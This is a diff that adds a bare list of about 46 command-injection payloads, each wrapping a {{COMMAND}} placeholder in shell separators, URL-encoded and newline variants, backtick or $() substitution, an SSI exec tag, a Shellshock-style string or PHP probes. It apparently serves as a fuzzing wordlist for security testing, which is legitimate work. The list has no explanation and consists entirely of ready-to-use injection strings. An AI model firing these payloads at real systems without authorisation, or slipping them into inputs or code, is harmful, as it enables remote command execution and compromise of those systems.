@@ -1,0 +1,46 @@
+''{{COMMAND}}
+";{{COMMAND}}
+';{{COMMAND}}
+');{{COMMAND}}
+");{{COMMAND}}
+|{{COMMAND}}
+||{{COMMAND}}
+||$({{COMMAND}})
+| {{COMMAND}}|
+%26 {{COMMAND}}
+%26%26 {{COMMAND}} %26%26
+%26%20{{COMMAND}}%20%26
+$(`{{COMMAND}}`)
+<${{{COMMAND}}}>0.0.0.0
+|| {{COMMAND}}||
+ ${{_COMMAND__}}
+; ${{{COMMAND}}}
+;$\({{COMMAND}}\)
+<!--#exec cmd="{{COMMAND}}"-->
+/index.html|{{COMMAND}}|
+() { :;};{{COMMAND}};
+%2 -n 21 127.0.0.1||{{COMMAND}}
+>{{COMMAND}}> /dev/null
+<{{COMMAND}}>127%2E0%2E0%2E0%2E1
+%0A{{COMMAND}}
+%0a%0d{{COMMAND}}%0d%0a
+\n\r{{COMMAND}}\n\r
+127%2E0%2E0%2E0%2E1;{{COMMAND}};
+%24%28%60{{COMMAND}}%60%29
+<<{{COMMAND}}>>
+${{{COMMAND}}}%00
+\x00{{COMMAND}}
+<echo<$({{COMMAND}})>/dev/null
+{{COMMAND}}
+&&{{COMMAND}}
+>{{COMMAND}}> /dev/null%00
+<{{COMMAND}}>127%2E0%2E0%2E0%2E1%00
+<echo<$({{COMMAND}})>/dev/null%00
+`{{COMMAND}}`%00
+&&{{COMMAND}}
+">{{COMMAND}}%00
+;${@print(md5(HELL))};
+0>0+#{{COMMAND}}#
+`{{COMMAND}}`
+;echo+'<?={{COMMAND}}?>'
+%26{{COMMAND}}%26
